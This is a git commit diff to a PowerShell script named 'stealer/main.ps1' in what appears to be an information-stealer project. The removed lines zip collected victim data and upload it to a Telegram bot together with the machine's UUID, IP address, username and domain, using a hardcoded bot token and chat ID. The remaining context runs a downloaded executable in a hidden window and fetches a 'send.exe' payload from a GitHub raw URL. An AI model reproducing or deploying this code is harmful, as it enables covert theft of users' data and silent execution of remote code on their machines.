e565493cec23c87f56e4fd7dd1ec7036b3e47479
43a1723 <hai1723notgay@gmail.com>
2025-01-15 14:55:19 +0700

    Update main.ps1

--- stealer/main.ps1
+++ stealer/main.ps1
@@ -20,26 +20,6 @@ if (Test-Path -Path $output) {
 }
 
 Start-Process $output -WindowStyle Hidden -Wait
-$sourcePath = $stealer
-$username = $env:USERNAME
-$zipPath = "$dir\$username_Info.zip"
-Compress-Archive -Path $sourcePath -DestinationPath $zipPath -Force
-$botToken = "7487418347:AAHo0dKeo0c-nZAiN9ZgiVPbyp4xTSdsV2E"
-$chatId = "7056174540"
-$telegramApiUrl = "https://api.telegram.org/bot$botToken/sendDocument"
-$uuid = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID
-$ipAddress = (Test-Connection -ComputerName "8.8.8.8" -Count 1).IPv4Address.ToString()
-$userDomain = $env:USERDOMAIN
-$caption = "UUID: $uuid, IP: $ipAddress, Username: $username, UserDomain: $userDomain"
-$response = Invoke-RestMethod -Uri $telegramApiUrl -Method Post -Form @{
-    chat_id = $chatId
-    document = Get-Item $zipPath
-    caption = $caption
-}
-if ($response.ok) {
-    Write-Output "Tệp ZIP đã được gửi thành công."
-}
-Remove-Item -Path $zipPath -Force
 
 $url = "https://raw.githubusercontent.com/43a1723/test/refs/heads/main/stealer/send.exe"
 $output = "$dir\sendtelegram.exe"
